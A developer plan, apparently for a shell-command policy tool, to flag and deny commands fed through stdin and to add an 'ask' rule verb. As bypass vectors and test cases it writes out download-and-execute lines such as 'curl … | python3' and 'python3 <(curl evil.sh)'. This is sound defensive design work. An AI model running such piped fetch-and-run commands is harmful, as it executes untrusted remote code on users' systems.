# Plan: deny stdin redirection at the AST level

A command is **stdin-fed** when its stmt carries a stdin redirect (`<`, `<<`,
`<<-`, `<<<`, `<>` on fd 0) or it is the right-hand side of a pipe. Rules gain
a `STDIN` marker that restricts a rule to stdin-fed commands, plus an `ask`
verb and a global `stdin` default directive.

1. In `extract.go`, add `stdinFed bool` to `extractedCmd` and a
   `map[*syntax.CallExpr]bool` on the walker: mark `stmt.Cmd` when a
   `*syntax.Stmt` has a redirect on fd 0 (`r.N == nil || r.N.Value == "0"`)
   with op `RdrIn`/`Hdoc`/`DashHdoc`/`WordHdoc`/`RdrInOut`, and mark `x.Y.Cmd`
   when a `*syntax.BinaryCmd` has op `Pipe`/`PipeAll`.
2. Fail closed on compound sinks: when that `Cmd` is not directly a
   `*syntax.CallExpr` (`Subshell`, `Block`, `WhileClause`, `IfClause`, …), set
   `ex.stdinCompound = true`; `decide()` denies the whole command with
   "stdin feeds a compound command; the receiving command is not statically
   identifiable". A `{ }` or `( )` group inherits the pipe's fd 0 verbatim, so
   `curl x | { python3; }` is a straight bypass otherwise.
3. In `extract.go`, have `buildCmd` take the marked set and set
   `cmd.stdinFed`; parents are walked before children so the set is populated
   in time.
4. In `match.go`, add `stdinOnly bool` to `rule` and pass `stdinFed` into
   `matchAny` so a `stdinOnly` rule never matches a command that is not
   stdin-fed.
5. In `rules.go`, teach `buildRule` to strip a leading `STDIN` token (setting
   `stdinOnly`) before the existing token validation, and require a
   single-quoted `'STDIN'` for a literal argument spelled that way.
6. In `rules.go`, add an `ask` verb alongside `allow`/`deny` collecting into a
   new `cfg.askRules` (allowed in both tiers — it only narrows). The verb is
   general, not `STDIN`-only, so it also closes the separate backlog item for
   `ask rm HAS -rf`.
7. In `rules.go`, add the global-only directive `stdin allow|ask|deny`
   (default `allow`, duplicate-checked via a `sawStdin` flag in `tierState`,
   ignored+logged in the project tier like `trust`/`sandbox`).
8. In `policy.go` `decideCommand`, evaluate deny → ask → allow rules, and when
   the result is allow and `cmd.stdinFed`, downgrade to `cfg.stdinDefault`.
9. Distinguish an explicit `ask` from the unmatched fallthrough so
   `main.go:166` does not emit automode `defer` for a rule that deliberately
   asked — add `outAskExplicit` (or a bool alongside the outcome) and let
   automode `defer` only the fallthrough, as §2.1 intends.
10. Add `StdinFed bool` to `cmdLog` so a deny reason is diagnosable from the
    log line and from `shizo test --json`.
11. In `validate.go`, warn on `STDIN` rules that are dead under `stdin deny`
    and on an ignored project-tier `stdin` directive.
12. Update `conf/editor/shizo.tmLanguage.json` with the `ask` verb, the
    `stdin` directive, and the `STDIN` token, and add a commented `STDIN`
    example to `conf/global-rules.starter`.
13. Add table cases: `extract_test.go` (heredoc, `<`, `<<<`, pipe RHS, nested
    pipes, `2< file` not flagged, compound sink sets `stdinCompound`),
    `match_test.go` (stdinOnly gating), `rules_test.go` (`STDIN` parsing,
    `'STDIN'` literal, `ask` verb, `stdin` directive placement/duplicate/
    project-ignored), `policy_test.go` (`cat f | grep x` still allowed by
    default; `deny STDIN python3` blocks `curl … | python3`;
    `curl … | { python3; }` denied; `ask STDIN bash HAS -c`; `stdin ask`
    default), `main_test.go` (explicit ask is not automode `defer`).
14. Update `docs/RULES.md` (STDIN marker, `ask` verb, `stdin` directive),
    `docs/EVALUATION.md` (step 11 ordering, the stdin downgrade, the compound
    sink deny), and `docs/ARCHITECTURE.md` (interpreter-via-stdin vector) as
    integrated prose.

Skipped: `<` source-path containment — reads are still unchecked, and a read
base is not the write base (cwd + tmpdirs); add when shizo should contain
exfiltration, reusing `contained()` with a second base list.

Known limitation (pre-existing, amplified here): rules match `argv[0]` as
written, so `deny STDIN python3` does not cover `curl x | /usr/bin/python3`.
Already tracked with its own plan —
[`PLAN-rule-basename-match.md`](PLAN-rule-basename-match.md). **Ordering:** that
plan changes `matchRule`/`matchAny` to take a `resolved` argument. If it lands
first, steps 4 and 8 here thread `stdinFed` alongside the existing `resolved`
parameter instead of adding the first one; if this plan lands first, that plan's
steps 1-4 apply to the `ask` rule list too (it already anticipates this).

Also adjacent, deliberately out of scope: `ANY`/`HAS` match the `<subst>`
placeholder, so `allow python3 ANY` covers `python3 <(curl evil.sh)`. That is a
matcher-semantics change touching every existing rule — separate backlog item.

